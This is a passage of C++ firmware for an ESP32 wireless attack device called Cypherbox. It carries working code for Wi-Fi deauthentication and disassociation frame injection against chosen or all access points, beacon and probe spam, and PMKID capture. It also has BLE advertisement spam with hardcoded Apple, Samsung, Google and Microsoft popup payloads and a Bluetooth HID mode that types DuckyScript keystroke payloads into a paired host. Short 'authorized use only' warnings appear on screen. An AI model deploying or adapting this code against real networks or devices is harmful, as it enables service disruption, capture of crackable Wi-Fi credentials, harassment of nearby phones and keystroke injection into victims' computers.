    wrapped(wifiNetworks[idx].bssid.c_str(), 18, 160, 30, 1, kColorDim);
    wrapped("Tap to select. Swipe to browse.", 18, 244, 30, 2, kColorWarn);
    footer("BOOT cancel", "Tap select");
    Event e = poll();
    if (handleUniversalEvent(e)) break;
    if (e.type == EventSwipeUp || e.type == EventSwipeLeft) idx = (idx + 1) % wifiCount;
    if (e.type == EventSwipeDown || e.type == EventSwipeRight) idx = (idx + wifiCount - 1) % wifiCount;
    if (e.type == EventTap) return idx;
    delay(20);
  }
  stopRequested = false;
  return -1;
}

void runAttack(uint8_t type) {
  stopRequested = false;
  uint8_t broadcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
  memset(&attack, 0, sizeof(attack));
  attack.type = type;
  attack.reason = 7;
  attack.active = true;
  attack.startedAt = millis();
  radioWifiSta();
  setupAttackRadio(1);
  if (type == 1 || type == 5) {
    int idx = pickNetwork(type == 1 ? "Deauth Target" : "PMKID Capture");
    if (idx < 0) {
      radioIdle();
      redraw = true;
      return;
    }
    macFromString(wifiNetworks[idx].bssid, attack.apMac);
    setupAttackRadio(wifiNetworks[idx].channel);
    if (type == 1) {
      buildMgmtFrame(attack.deauth, broadcast, attack.apMac, 0xC0, attack.reason);
      buildMgmtFrame(attack.disassoc, broadcast, attack.apMac, 0xA0, attack.reason);
    } else {
      strncpy(attack.pmkidSsid, wifiNetworks[idx].ssid.c_str(), sizeof(attack.pmkidSsid) - 1);
      esp_wifi_get_mac(WIFI_IF_STA, attack.selfMac);
      esp_wifi_set_promiscuous_rx_cb(pmkidSniffer);
    }
  } else if (type == 2) {
    scanWifi(false);
    for (uint8_t i = 0; i < wifiCount && attack.apCount < kMaxNetworks; i++) {
      if (macFromString(wifiNetworks[i].bssid, attack.apList[attack.apCount])) {
        attack.apChannels[attack.apCount] = wifiNetworks[i].channel ? wifiNetworks[i].channel : 1;
        attack.apCount++;
      }
    }
    setupAttackRadio(attack.apCount ? attack.apChannels[0] : 1);
  }
  attackLoop(kAttackMenu[type - 1]);
}

void printWifiHelp(Transport transport) {
  outPrintln(transport, "wifi commands:");
  outPrintln(transport, "  help, status, stop, sd list");
  outPrintln(transport, "  wifi scan, wifi list, wifi heatmap");
  outPrintln(transport, "  web start");
  outPrintln(transport, "  portal list, portal start <0-9>");
  outPrintln(transport, "  attack deauth-target, deauth-all, beacon, probe, pmkid");
  outPrintln(transport, "  nfc/gps: unsupported on no-external-module Waveshare port");
}

void printBleHelp(Transport transport) {
  outPrintln(transport, "ble commands:");
  outPrintln(transport, "  help, status, stop, sd list");
  outPrintln(transport, "  ble serial, ble scan, ble list, ble spam, ble hid, ble mouse, ble pairing");
  outPrintln(transport, "  nfc/gps: unsupported on no-external-module Waveshare port");
}

void printStatus(Transport transport) {
  outPrintf(transport, "heap=%lu uptime_s=%lu sd=%s wifi=%d ble=%s scans=%u ble_devices=%u\r\n",
            static_cast<unsigned long>(ESP.getFreeHeap()),
            static_cast<unsigned long>(millis() / 1000),
            sdReady() ? "yes" : "no",
            static_cast<int>(WiFi.getMode()),
            NimBLEDevice::isInitialized() ? "yes" : "no",
            wifiCount,
            bleCount);
}

void handleWifiCommand(const String& raw, Transport transport) {
  String line = lowerCopy(raw);
  if (line == "help") printWifiHelp(transport);
  else if (line == "status") printStatus(transport);
  else if (line == "sd list") printSdList(transport);
  else if (line == "wifi scan") runWifiScan();
  else if (line == "wifi list") {
    for (uint8_t i = 0; i < wifiCount; i++) {
      outPrintf(transport, "%02u ch=%u rssi=%ld %s %s \"%s\"\r\n", i + 1,
                wifiNetworks[i].channel, static_cast<long>(wifiNetworks[i].rssi),
                authName(wifiNetworks[i].auth), wifiNetworks[i].bssid.c_str(),
                wifiNetworks[i].ssid.c_str());
    }
  } else if (line == "wifi heatmap") runWifiHeatmap();
  else if (line == "web start") startReadOnlyWeb();
  else if (line == "portal list") {
    for (uint8_t i = 0; i < 10; i++) outPrintf(transport, "%u: %s\r\n", i, kPortalNames[i]);
  } else if (line.startsWith("portal start")) {
    int idx = constrain(line.substring(String("portal start").length()).toInt(), 0, 9);
    runCaptivePortal(idx);
  } else if (line == "attack deauth-target") runAttack(1);
  else if (line == "attack deauth-all") runAttack(2);
  else if (line == "attack beacon") runAttack(3);
  else if (line == "attack probe") runAttack(4);
  else if (line == "attack pmkid") runAttack(5);
  else if (line.startsWith("nfc") || line.startsWith("apdu") || line.startsWith("gps") || line.startsWith("wardriver")) {
    outPrintln(transport, "unsupported: no external PN532/GPS module in this Waveshare port");
  } else {
    outPrintln(transport, "unknown command; type help");
  }
}

void decodeVendor(const std::string& md, char* out, size_t outLen) {
  out[0] = '\0';
  if (md.size() < 2) return;
  uint16_t company = static_cast<uint8_t>(md[0]) | (static_cast<uint8_t>(md[1]) << 8);
  switch (company) {
    case 0x004C:
      strncpy(out, md.size() >= 3 && static_cast<uint8_t>(md[2]) == 0x12 ? "Apple Find My" : "Apple",
              outLen - 1);
      break;
    case 0x0075: strncpy(out, "Samsung", outLen - 1); break;
    case 0x0006: strncpy(out, "Microsoft", outLen - 1); break;
    case 0x00E0: strncpy(out, "Google", outLen - 1); break;
    default: snprintf(out, outLen, "ID 0x%04X", company); break;
  }
}

void performBleScan(bool printTable = true) {
  radioBle();
  NimBLEDevice::init("Wave-Cypherbox");
  bleScan = NimBLEDevice::getScan();
  bleScan->setActiveScan(true);
  clear();
  header("BLE Scan");
  wrapped("Scanning BLE advertisements...", 18, 84, 30, 2, kColorText);
  NimBLEScanResults results = bleScan->getResults(5000, false);
  bleCount = min<int>(results.getCount(), kMaxBleDevices);
  for (uint8_t i = 0; i < bleCount; i++) {
    const NimBLEAdvertisedDevice* dev = results.getDevice(i);
    if (!dev) continue;
    bleDevices[i] = {};
    strncpy(bleDevices[i].name, dev->getName().c_str(), sizeof(bleDevices[i].name) - 1);
    strncpy(bleDevices[i].address, dev->getAddress().toString().c_str(), sizeof(bleDevices[i].address) - 1);
    bleDevices[i].rssi = dev->getRSSI();
    bleDevices[i].connectable = dev->isConnectable();
    if (dev->haveManufacturerData()) decodeVendor(dev->getManufacturerData(0), bleDevices[i].vendor,
                                                  sizeof(bleDevices[i].vendor));
    if (dev->haveServiceUUID()) strncpy(bleDevices[i].service, dev->getServiceUUID(0).toString().c_str(),
                                        sizeof(bleDevices[i].service) - 1);
  }
  bleScan->clearResults();
  if (printTable) {
    Serial.printf("ble devices=%u\n", bleCount);
    for (uint8_t i = 0; i < bleCount; i++) {
      Serial.printf("  %02u rssi=%d conn=%d addr=%s vendor=\"%s\" svc=\"%s\" name=\"%s\"\n",
                    i + 1, bleDevices[i].rssi, bleDevices[i].connectable ? 1 : 0,
                    bleDevices[i].address, bleDevices[i].vendor, bleDevices[i].service,
                    bleDevices[i].name[0] ? bleDevices[i].name : "(no name)");
    }
  }
}

void saveBleCsv() {
  if (!ensureBaseDirs()) return;
  String path = nextFile("ble", "csv");
  File f = SD_MMC.open(path, FILE_WRITE);
  if (!f) return;
  f.println("name,address,rssi,connectable,vendor,service");
  for (uint8_t i = 0; i < bleCount; i++) {
    f.print(csvEscape(bleDevices[i].name)); f.print(',');
    f.print(csvEscape(bleDevices[i].address)); f.print(',');
    f.print(bleDevices[i].rssi); f.print(',');
    f.print(bleDevices[i].connectable ? 1 : 0); f.print(',');
    f.print(csvEscape(bleDevices[i].vendor)); f.print(',');
    f.println(csvEscape(bleDevices[i].service));
  }
  f.close();
  Serial.printf("saved %s\n", path.c_str());
}

void runBleScan() {
  stopRequested = false;
  performBleScan();
  uint8_t idx = 0;
  while (!stopRequested) {
    clear();
    String right = String(bleCount) + " dev";
    header("BLE Scan", right.c_str());
    if (!bleCount) {
      wrapped("No BLE devices found. Tap to rescan.", 18, 82, 30, 2, kColorWarn);
    } else {
      BleDeviceInfo& d = bleDevices[idx];
      wrapped(d.name[0] ? d.name : "(no name)", 18, 72, 30, 2, kColorText);
      wrapped(d.address, 18, 138, 30, 1, kColorDim);
      char line[96];
      snprintf(line, sizeof(line), "%d dBm %s %s", d.rssi, d.connectable ? "connectable" : "beacon",
               d.vendor[0] ? d.vendor : "");
      wrapped(line, 18, 190, 30, 3, kColorAccent);
      wrapped("Long press saves CSV. Tap rescans.", 18, 300, 30, 2, kColorDim);
    }
    footer("BOOT back", "Long save");
    while (!stopRequested) {
      Event e = poll();
      if (handleUniversalEvent(e)) break;
      if (e.type == EventSwipeUp || e.type == EventSwipeLeft) {
        if (bleCount) idx = (idx + 1) % bleCount;
        break;
      }
      if (e.type == EventSwipeDown || e.type == EventSwipeRight) {
        if (bleCount) idx = (idx + bleCount - 1) % bleCount;
        break;
      }
      if (e.type == EventTap) {
        performBleScan();
        idx = 0;
        break;
      }
      if (e.type == EventLongPress) {
        saveBleCsv();
        message("BLE Scan", "CSV saved under cypherbox logs.", kColorGood);
        delay(900);
        break;
      }
      delay(15);
    }
  }
  stopRequested = false;
  radioIdle();
  redraw = true;
}

void randomizeBleAddress() {
  uint8_t addr[6];
  esp_fill_random(addr, 6);
  addr[5] |= 0xC0;
  NimBLEDevice::setOwnAddr(addr);
  NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
}

void buildBleSpam(uint8_t vector, NimBLEAdvertisementData& data) {
  if (vector == 0) {
    uint8_t payload[31] = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0xe6,0x55};
    for (uint8_t i = 10; i < sizeof(payload); i++) payload[i] = random(256);
    data.addData(payload, sizeof(payload));
  } else if (vector == 1) {
    uint8_t payload[] = {0x1b,0xff,0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0x21,
                         0x01,0x09,0x01,0x00,0x00,0x06,0x3c,0x94,0x8e,0,0,0,0,0xc7,0};
    data.addData(payload, sizeof(payload));
  } else if (vector == 2) {
    data.setFlags(0x06);
    uint8_t model[3] = {0xCD, 0x82, 0x56};
    data.setServiceData(NimBLEUUID(static_cast<uint16_t>(0xFE2C)), model, sizeof(model));
  } else {
    const char* name = "Keyboard";
    uint8_t payload[24];
    int n = 0;
    payload[n++] = strlen(name) + 6;
    payload[n++] = 0xff;
    payload[n++] = 0x06; payload[n++] = 0x00;
    payload[n++] = 0x03; payload[n++] = 0x00; payload[n++] = 0x80;
    memcpy(payload + n, name, strlen(name)); n += strlen(name);
    data.addData(payload, n);
  }
}

void runBleSpam() {
  stopRequested = false;
  radioBle();
  NimBLEDevice::init("");
  NimBLEDevice::setPower(9);
  bleAdvertiser = NimBLEDevice::getAdvertising();
  bleAdvertiser->setConnectableMode(BLE_GAP_CONN_MODE_NON);
  bleAdvertiser->setMinInterval(0x20);
  bleAdvertiser->setMaxInterval(0x30);
  const char* names[] = {"Apple", "Samsung", "Google", "Microsoft", "All"};
  uint8_t vector = 4;
  bool running = false;
  uint32_t sent = 0;
  uint8_t rotate = 0;
  while (!pollStop()) {
    if (running) {
      uint8_t v = vector == 4 ? rotate : vector;
      bleAdvertiser->stop();
      randomizeBleAddress();
      NimBLEAdvertisementData data;
      buildBleSpam(v, data);
      bleAdvertiser->setAdvertisementData(data);
      bleAdvertiser->start();
      sent++;
      rotate = (rotate + 1) % 4;
    }
    clear();
    String right = String(sent);
    header(running ? "BLE Spam Active" : "BLE Spam", right.c_str());
    wrapped(names[vector], 18, 80, 30, 1, kColorAccent);
    wrapped("Authorized testing only. Swipe picks vector, tap toggles.", 18, 150, 30, 4, kColorWarn);
    footer("BOOT stop", running ? "Tap pause" : "Tap start");
    uint32_t start = millis();
    while (millis() - start < (running ? 60 : 120)) {
      Event e = poll();
      if (handleUniversalEvent(e)) break;
      if (!running && (e.type == EventSwipeUp || e.type == EventSwipeLeft)) vector = (vector + 1) % 5;
      if (!running && (e.type == EventSwipeDown || e.type == EventSwipeRight)) vector = (vector + 4) % 5;
      if (e.type == EventTap) {
        running = !running;
        if (!running && bleAdvertiser) bleAdvertiser->stop();
      }
      delay(3);
    }
  }
  if (bleAdvertiser) bleAdvertiser->stop();
  stopRequested = false;
  radioIdle();
  redraw = true;
}

class BleSerialCallbacks : public NimBLECharacteristicCallbacks {
 public:
  void onWrite(NimBLECharacteristic* characteristic, NimBLEConnInfo& connInfo) override {
    (void)connInfo;
    std::string value = characteristic->getValue();
    for (char c : value) {
      if (c == '\r') continue;
      if (c == '\n') {
        bleSerialReady = true;
      } else if (bleSerialLine.length() < 156) {
        bleSerialLine += c;
      }
    }
  }
};

BleSerialCallbacks bleSerialCallbacks;

void handleBleCommand(const String& raw, Transport transport);

void runBleSerial() {
  stopRequested = false;
  radioBle();
  NimBLEDevice::init("WAVE-CYPHERBOX");
  NimBLEServer* server = NimBLEDevice::createServer();
  NimBLEService* service = server->createService("6E400001-B5A3-F393-E0A9-E50E24DCCA9E");
  bleSerialTx = service->createCharacteristic("6E400003-B5A3-F393-E0A9-E50E24DCCA9E",
                                              NIMBLE_PROPERTY::NOTIFY);
  NimBLECharacteristic* rx = service->createCharacteristic("6E400002-B5A3-F393-E0A9-E50E24DCCA9E",
                                                           NIMBLE_PROPERTY::WRITE |
                                                               NIMBLE_PROPERTY::WRITE_NR);
  rx->setCallbacks(&bleSerialCallbacks);
  service->start();
  NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
  adv->addServiceUUID(service->getUUID());
  adv->start();
  outPrintln(Transport::Ble, "WAVE-CYPHERBOX BLE shell ready");
  outPrintln(Transport::Ble, "mini> ");
  while (!pollStop()) {
    if (bleSerialReady) {
      String line = bleSerialLine;
      bleSerialLine = "";
      bleSerialReady = false;
      handleBleCommand(line, Transport::Ble);
      outPrint(Transport::Ble, "mini> ");
    }
    clear();
    String right = String(server->getConnectedCount()) + " host";
    header("BLE Serial", right.c_str());
    wrapped("Nordic UART shell: WAVE-CYPHERBOX", 18, 78, 30, 2, kColorAccent);
    wrapped("Use help/status/sd list/stop. WiFi/NFC/GPS are rejected in this foreground BLE session.",
            18, 164, 30, 5, kColorDim);
    footer("BOOT stop", "BLE shell");
    delay(120);
  }
  stopRequested = false;
  radioIdle();
  redraw = true;
}

void seedPayload() {
  if (!ensureBaseDirs()) return;
  String path = String(kPayloadDir) + "/macos/hello.duck";
  if (SD_MMC.exists(path)) return;
  File f = SD_MMC.open(path, FILE_WRITE);
  if (!f) return;
  f.println("REM Harmless Waveshare Cypherbox test payload");
  f.println("STRINGLN Hello from Waveshare Cypherbox");
  f.close();
}

void hidInit() {
  radioBle();
  seedPayload();
  hidx::init(BT_HID_DEVICE_NAME, BT_HID_DEVICE_MANUF, BT_HID_DEVICE_BATTERY);
}

std::vector<String> collectPayloads() {
  std::vector<String> out;
  if (!ensureBaseDirs()) return out;
  File root = SD_MMC.open(kPayloadDir);
  if (!root) return out;
  while (true) {
    File entry = root.openNextFile();
    if (!entry) break;
    if (entry.isDirectory()) {
      File sub = SD_MMC.open(entry.name());
      while (sub) {
        File f = sub.openNextFile();
        if (!f) break;
        String name = String(f.name());
        if (!f.isDirectory() && name.endsWith(".duck")) out.push_back(name);
        f.close();
      }
      if (sub) sub.close();
    } else {
      String name = String(entry.name());
      if (name.endsWith(".duck")) out.push_back(name);
    }
    entry.close();
  }
  root.close();
  std::sort(out.begin(), out.end());
  return out;
}

void runBtHid() {
  stopRequested = false;
  hidInit();
  std::vector<String> files = collectPayloads();
  uint8_t idx = 0;
  while (!stopRequested) {
    clear();
    header("BT HID", hidx::isConnected() ? "host" : "adv");
    if (files.empty()) {
      wrapped("No .duck payloads found. Seeded hello.duck if SD is mounted.", 18, 80, 30, 4, kColorWarn);
    } else {
      String name = files[idx];
      int slash = name.lastIndexOf('/');
      if (slash >= 0) name = name.substring(slash + 1);
      wrapped(name.c_str(), 18, 80, 30, 2, kColorText);
      wrapped("Tap runs payload on the paired host. Authorized use only.", 18, 170, 30, 4, kColorWarn);
    }
    footer("BOOT back", "Tap run");
    Event e = poll();
    if (handleUniversalEvent(e)) break;
    if (!files.empty() && (e.type == EventSwipeUp || e.type == EventSwipeLeft)) idx = (idx + 1) % files.size();
    if (!files.empty() && (e.type == EventSwipeDown || e.type == EventSwipeRight)) idx = (idx + files.size() - 1) % files.size();
    if (!files.empty() && e.type == EventTap) {
      File f = SD_MMC.open(files[idx], FILE_READ);
      std::string script;
      while (f && f.available()) script += static_cast<char>(f.read());
      if (f) f.close();
      bool ok = payload::run(script);
      message("BT HID", ok ? "Payload sent." : "No BLE HID host connected.", ok ? kColorGood : kColorWarn);
      delay(1000);
    }
    delay(20);
  }
  stopRequested = false;
  radioIdle();
  redraw = true;
}

void runMouseJiggler() {
  stopRequested = false;
  radioBle();
  NimBLEDevice::init("cypherbox-mouse");
  NimBLEDevice::setPower(9);
  NimBLEServer* server = NimBLEDevice::createServer();
  NimBLEHIDDevice* hid = new NimBLEHIDDevice(server);
  NimBLECharacteristic* input = hid->getInputReport(1);
  const uint8_t map[] = {
      0x05,0x01,0x09,0x02,0xA1,0x01,0x85,0x01,0x09,0x01,0xA1,0x00,0x05,0x09,
      0x19,0x01,0x29,0x03,0x15,0x00,0x25,0x01,0x95,0x03,0x75,0x01,0x81,0x02,
      0x95,0x01,0x75,0x05,0x81,0x03,0x05,0x01,0x09,0x30,0x09,0x31,0x09,0x38,
      0x15,0x81,0x25,0x7F,0x75,0x08,0x95,0x03,0x81,0x06,0xC0,0xC0};
  hid->setPnp(0x02, 0xE502, 0xA111, 0x0210);
  hid->setHidInfo(0x00, 0x01);
  hid->setReportMap(const_cast<uint8_t*>(map), sizeof(map));
  hid->setBatteryLevel(100);
  NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
  adv->setAppearance(0x03C2);
  adv->addServiceUUID(hid->getHidService()->getUUID());
  adv->start();
  uint32_t moves = 0;
  bool dir = false;
  uint32_t last = 0;
  while (!pollStop()) {
    if (server->getConnectedCount() && millis() - last >= 4000) {
      uint8_t report[4] = {0, static_cast<uint8_t>(dir ? 4 : -4), 0, 0};
      input->setValue(report, sizeof(report));
      input->notify();
      dir = !dir;
      moves++;
      last = millis();
    }
    clear();
    String right = String(moves);
    header("Mouse Jiggler", right.c_str());
    wrapped(server->getConnectedCount() ? "Host connected" : "Advertising as cypherbox-mouse",
            18, 86, 30, 3, kColorText);
    wrapped("Nudges every 4 seconds. BOOT exits.", 18, 210, 30, 3, kColorDim);
    footer("BOOT stop", "BLE mouse");
    delay(180);
  }
  delete hid;
  stopRequested = false;
  radioIdle();
  redraw = true;
}

void passkeyCb(uint32_t passkey) {
  hidPasskey = passkey;
}

void runPairing() {
  stopRequested = false;
  hidInit();
  hidx::onPasskey(passkeyCb);
  while (!pollStop()) {
    clear();
    header("BLE Pairing", hidx::isConnected() ? "host" : "adv");
    if (hidPasskey) {
      char line[32];
      snprintf(line, sizeof(line), "Passkey: %06lu", static_cast<unsigned long>(hidPasskey));
      wrapped(line, 18, 88, 30, 1, kColorAccent);
    } else {
      wrapped(hidx::isBonded() ? "Bond stored. Waiting for host." : "Advertising HID for pairing.",
              18, 88, 30, 3, kColorText);
    }
    wrapped("Tap clears stored bonds.", 18, 210, 30, 2, kColorWarn);
    footer("BOOT back", "Tap clear");
    Event e = poll();
    if (handleUniversalEvent(e)) break;
    if (e.type == EventTap) {
      hidx::clearBonds();
      hidPasskey = 0;
      message("BLE Pairing", "Bonds cleared.", kColorGood);
      delay(800);
    }
    delay(80);
  }
  stopRequested = false;
  radioIdle();
  redraw = true;
}

void handleBleCommand(const String& raw, Transport transport) {
  String line = lowerCopy(raw);
  if (line == "help") printBleHelp(transport);
  else if (line == "status") printStatus(transport);
  else if (line == "sd list") printSdList(transport);
  else if (line == "ble serial") {
    if (transport == Transport::Ble) outPrintln(transport, "already in BLE Serial");
    else runBleSerial();
  } else if (line == "ble scan") {
    if (transport == Transport::Ble) outPrintln(transport, "exit BLE Serial before BLE scan");
    else runBleScan();
  } else if (line == "ble list") {
    for (uint8_t i = 0; i < bleCount; i++) {
      outPrintf(transport, "%02u rssi=%d addr=%s vendor=\"%s\" name=\"%s\"\r\n",
                i + 1, bleDevices[i].rssi, bleDevices[i].address, bleDevices[i].vendor,
                bleDevices[i].name[0] ? bleDevices[i].name : "(no name)");
    }
  } else if (line == "ble spam") {
    if (transport == Transport::Ble) outPrintln(transport, "exit BLE Serial before BLE spam");
    else runBleSpam();
  } else if (line == "ble hid") {
    if (transport == Transport::Ble) outPrintln(transport, "exit BLE Serial before BT HID");
    else runBtHid();
  } else if (line == "ble mouse") {
    if (transport == Transport::Ble) outPrintln(transport, "exit BLE Serial before mouse mode");
    else runMouseJiggler();
  } else if (line == "ble pairing") {
    if (transport == Transport::Ble) outPrintln(transport, "exit BLE Serial before pairing");
    else runPairing();
  } else if (line.startsWith("nfc") || line.startsWith("apdu") || line.startsWith("gps") || line.startsWith("wardriver")) {
    outPrintln(transport, "unsupported: no external PN532/GPS module in this Waveshare port");
  } else if (line.startsWith("wifi") || line.startsWith("web") || line.startsWith("portal") || line.startsWith("attack")) {
    outPrintln(transport, "unsupported in BLE app; use Cypherbox WiFi Tools");
  } else {
    outPrintln(transport, "unknown command; type help");
  }
}

void selectWifiItem() {
  if (screen == Screen::WifiMenu) {
    switch (selected) {
      case 0: runWifiScan(); break;
      case 1: runWifiHeatmap(); break;
      case 2: runCaptivePortal(); break;
      case 3: screen = Screen::WifiAttacks; selected = top = 0; redraw = true; break;
      case 4: startReadOnlyWeb(); break;
      case 5: showSdFiles(); break;
      case 6: printWifiHelp(Transport::Usb); message("Serial Help", "Help printed over USB serial.", kColorGood); break;
      case 7: returnToLauncher(); break;
    }
  } else {
    if (selected < 5) runAttack(selected + 1);
    else { screen = Screen::WifiMenu; selected = top = 0; redraw = true; }
  }
}

void selectBleItem() {
  switch (selected) {
    case 0: runBleSerial(); break;
    case 1: runBleScan(); break;
    case 2: runBleSpam(); break;
    case 3: runBtHid(); break;
    case 4: runMouseJiggler(); break;
    case 5: runPairing(); break;
    case 6: showSdFiles(); break;
    case 7: printBleHelp(Transport::Usb); message("Serial Help", "Help printed over USB serial.", kColorGood); break;
    case 8: returnToLauncher(); break;
  }
}

void menuLoop(bool bleApp) {
  const char* const* items = bleApp ? kBleMenu : (screen == Screen::WifiMenu ? kWifiMenu : kAttackMenu);
  uint8_t count = bleApp ? (sizeof(kBleMenu) / sizeof(kBleMenu[0])) :
                  (screen == Screen::WifiMenu ? sizeof(kWifiMenu) / sizeof(kWifiMenu[0])
                                               : sizeof(kAttackMenu) / sizeof(kAttackMenu[0]));
  if (redraw) {
    drawMenu(bleApp ? "Cypherbox BLE" : (screen == Screen::WifiMenu ? "Cypherbox WiFi" : "WiFi Attacks"),
             items, count, bleApp ? "BLE" : "WiFi");
    redraw = false;
  }
  Event e = poll();
  if (e.type == EventNone) return;
  if (isHome(e)) returnToLauncher();
  if (isBack(e)) {
    if (!bleApp && screen == Screen::WifiAttacks) {
      screen = Screen::WifiMenu;
      selected = top = 0;
      redraw = true;
    }
    return;
  }
  if (e.type == EventSwipeUp || e.type == EventSwipeLeft) {
    selected = (selected + 1) % count;
    redraw = true;
  } else if (e.type == EventSwipeDown || e.type == EventSwipeRight) {
    selected = (selected + count - 1) % count;
    redraw = true;
  } else if (e.type == EventTap) {
    uint8_t row = (e.y >= 58) ? (e.y - 58) / 58 : 255;
    if (row < 5 && top + row < count) selected = top + row;
    if (bleApp) selectBleItem();
    else selectWifiItem();
    redraw = true;
  } else if (e.type == EventSerialLine) {
    String line = lowerCopy(e.line);
    if (line == "home") returnToLauncher();
    if (line == "stop") return;
    if (bleApp) handleBleCommand(line, Transport::Usb);
    else handleWifiCommand(line, Transport::Usb);
    redraw = true;
  }
}

}  // namespace

void beginWifiTools() {
  begin("Cypherbox WiFi", true);
  ensureBaseDirs();
  radioIdle();
  printWifiHelp(Transport::Usb);
  screen = Screen::WifiMenu;
  selected = top = 0;
  redraw = true;
}

void loopWifiTools() {
  menuLoop(false);
  delay(16);
}

void beginBleTools() {
  begin("Cypherbox BLE", true);
  ensureBaseDirs();
  seedPayload();
  radioIdle();
  printBleHelp(Transport::Usb);
  screen = Screen::BleMenu;
  selected = top = 0;
  redraw = true;
}

void loopBleTools() {
  menuLoop(true);
  delay(16);
}

}  // namespace WaveshareCypherbox
